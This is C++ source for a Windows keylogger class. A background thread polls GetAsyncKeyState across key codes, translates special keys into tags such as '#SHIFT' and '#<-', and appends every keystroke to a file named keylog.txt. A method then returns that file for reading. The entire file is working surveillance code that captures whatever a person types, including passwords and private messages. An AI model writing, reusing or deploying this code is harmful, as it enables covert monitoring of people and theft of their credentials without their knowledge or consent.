#include "KeyLogger.h"

#include <cstring>
#include <fstream>
#include <cstddef>
#include <thread>
#include <cctype>

#include <windows.h>

KeyLogger::KeyLogger(): 
// buf(new char[kBufSize]), 
stop(true) {
}

KeyLogger::KeyLogger(const KeyLogger &o) {  
    // buf = new char[kBufSize];
    // memcpy(buf, o.buf, kBufSize);
}

KeyLogger::~KeyLogger() {
    // delete[] buf;
    // buf = NULL;
    fout.close();
}

void KeyLogger::log(std::string s) {
    fout << s;
    // TODO REMOVE 2 l
    fout.flush();
}

bool KeyLogger::logSpecialKey(int S_Key) {
	switch (S_Key) {
    case VK_SPACE:
		log(" ");
		return true;
	case VK_RETURN:
		
		log("\n");
		return true;
	case VK_OEM_PERIOD:
		
		log(".");
		return true;
	case VK_LSHIFT:
	case VK_RSHIFT:
	case VK_SHIFT:
		
		log("#SHIFT");
		return true;
	case VK_BACK:
		
		log("#<-");
		return true;
	case VK_RBUTTON:
		
		log("#R_CLICK");
		return true;
	case VK_CAPITAL:
		
		log("#CAPS_LOCK");
		return true;
	case VK_TAB:
		
		log("#TAB");
		return true;
	case VK_UP:
		
		log("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		
		log("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		
		log("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		
		log("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		
		log("#CONTROL");
		return true;
	case VK_MENU:
		
		log("#ALT");
		return true;
	default: 
		return false;
	}
}

KeyLogger& KeyLogger::operator=(const KeyLogger &o) {
    if (this == &o)
        return *this;

    // delete[] buf;
    // buf = new char[kBufSize];
    // memcpy(buf, o.buf, kBufSize);
    return *this;
}

// TODO MOUSE
void KeyLogger::startKeylogger() {
    fout = std::ofstream("keylog.txt", std::fstream::out);
    if (!fout.good()) {
        std::cout << "error creating keylogger file\n";
        // TODO NOTIFY
    }
    fout.close();
    fout.clear();
    fout.open("keylog.txt", std::fstream::app);
    
    auto keylog = [](KeyLogger *keylogger2) {
        KeyLogger& keylogger = *keylogger2;
        while (!keylogger.stop) {
            for (int key = 0x08; key <= 0xB7; ++key) {
                if (GetAsyncKeyState(key) == -32767) {
                    if (!keylogger.logSpecialKey(key)) {
						char c = key;
						if (std::isalpha(c))
							c = std::tolower(c);
						
                        keylogger.log(std::string("") + c);
                    }
                }
            }
        }
    };
    stop = false;
    logThread = std::thread(keylog, this);	
}

void KeyLogger::stopKeylogger() {
    stop = true;
    fout.close();
	logThread.join();
}

std::ifstream KeyLogger::getLoggingStream() {
    return std::ifstream("keylog.txt");
}
